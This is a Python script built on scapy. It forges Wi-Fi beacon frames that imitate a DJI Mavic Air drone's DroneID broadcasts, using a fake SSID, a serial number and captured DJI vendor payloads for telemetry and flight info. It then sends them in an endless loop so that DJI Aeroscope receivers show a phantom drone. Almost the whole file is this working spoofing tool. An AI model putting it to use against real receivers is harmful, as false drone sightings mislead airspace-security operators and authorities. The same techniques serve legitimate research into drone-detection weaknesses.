from __future__ import print_function
from scapy.all import(hexdump, RadioTap)
from scapy.layers.dot11 import *
from scapy.utils import rdpcap
from scapy.sendrecv import sendp
from binascii import unhexlify, hexlify
import string
import random


class DroneID:
    """ The information displayed on the Aeroscope is
    Serial number
    Latitude/Longitude
    Aircraft Type: Mavi Air
    Home Latitude/Longitude
    Aircraft HS (Height speed?)
    Altitude
    Distance
    Height
    Home Distance
    Aircraft VS (Vertical Speend)
    Pilot Latitude/Longitude
    UUID
    Identification
    Flight Information
    Pilot Distance
     """
    def __init__(self):

        self.SSID = 'MAVIC-AIR-FAKE11'
        self.sernum = '0K1CG6G3AH8V2M'  # Must be 16 characters... missing 2 ?


# Set up monitor interface
interface = 'wlx801f02f1e3dc'
drone = DroneID()

# 802.11 MAC HEADER
# ==== Frame Control 2 bytes: 0x8000 ====
version = 0
frame_type = 0  # Managemnet frame 00
frame_subtype = 8  # Beacon 1000
flags = 0

# ==== Duration 2 bytes ====

duration = 0

# ==== Address 6 bytes per address ====

dest_addr = 'ff:ff:ff:ff:ff:ff'  # address 1
src_addr = '60:60:1f:97:f0:85'  # address 2
bssid = src_addr # addr 3

# ==== Sequence Control 2 bytes ====

fragment_number = 0
seq_number = 0

# ==== Frame Body -- 802.11 Management Beacon =========

# == Mandatory ================================ #
b_timestamp = 2471788032597 # Timestamp 8 bytes
b_interval = 102            # Beacon Interval 2 Bytes
cap_flags = 0x0431          # Capability Info 2 Bytes. We can also pass strings: "ESS+privacy+othercapabilities"

beacon_fields = Dot11Beacon(timestamp = b_timestamp, beacon_interval = b_interval, cap = 'ESS+privacy') # Scapy

# === Information Elements:
# Each scapy Information Element is defined in Dot11Elt(ID, len, info)
# Inside info there might be other fields, check standard

# == Mandatory IE:SSID == #
ie_ssid_id = 0 # Information Element  SSID. We can use a string as "SSID"
ie_ssie_len = len(drone.SSID)
ie_ssid_info = drone.SSID

ie_ssid = Dot11Elt(ID = ie_ssid_id, len= ie_ssie_len, info = ie_ssid_info) # Scapy builds the Information Element

# == Mandatory IE:Supported Rates == #
ie_rates = Dot11Elt(ID='Rates', len=8, info = b'\x82\x84\x8b\x96\x0c\x12\x18\x24')


# == Non Mandatory ==

#vendor_microsoft = Dot11EltVendorSpecific(ID=221, len= 24, oui= 0x0050f2,info = b'\x02\x01\x01\x00\x00\x03\xa4\x00\x00\x27\xa4\x00\x00\x42\x43\x5e\x00\x62\x32\x2f\x00')


# == Information Element: Vendor Specifics (221)



# Captured from DJI MAVIC. No GPS signal
# First one sends telemetry. Second one sends Flight Information

# Telemetry
vendor_payload = b'Xb\x13\x10\x02M\x063\x1f0K1CG6G3AH8V2M\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xef\xff\x0c\x00\x00\x00\x00\x00\x00\x00\xb0C\x85\xb3\xa0(v\x01\x00\x00E\x89|\x00\xcc=\x14\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'

# Flight Info
vendor_payload2 = b'Xb\x13\x113K1CG6G3AH8V2M\x00\x00\xcc\xaa\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'

# Vendor Specific: 26:37:12 (DJI)
ie_vendor_dji = Dot11EltVendorSpecific(ID=221, len = len(vendor_payload) + 3 ,oui=0x263712, info = vendor_payload)
# Flight Info
ie_vendor_dji_flighT_info = Dot11EltVendorSpecific(ID=221, len = len(vendor_payload2) + 3 ,oui=0x263712, info = vendor_payload2)

# We could add country info element since this info is received by the Aeroscope

# Let's build the packet
# Sending two DroneID on the same packet does not work
#packet = RadioTap() / Dot11() / beacon_fields / ie_ssid / ie_rates / ie_vendor_dji# Assemble all parts

packet = RadioTap() / Dot11() / beacon_fields / ie_ssid / ie_rates #/ ie_vendor_dji
packet.subtype = frame_subtype
packet.type = frame_type
packet.addr1 = dest_addr
packet.addr2 = src_addr
packet.addr3 = src_addr
packet.SC = fragment_number + seq_number

packet_flightinfo = packet

packet = packet / ie_vendor_dji
packet_flightinfo = packet_flightinfo /ie_vendor_dji_flighT_info

packet_list = [packet, packet_flightinfo]
print(packet_list)

sendp(packet,iface= interface, loop = 1, inter= 0.3)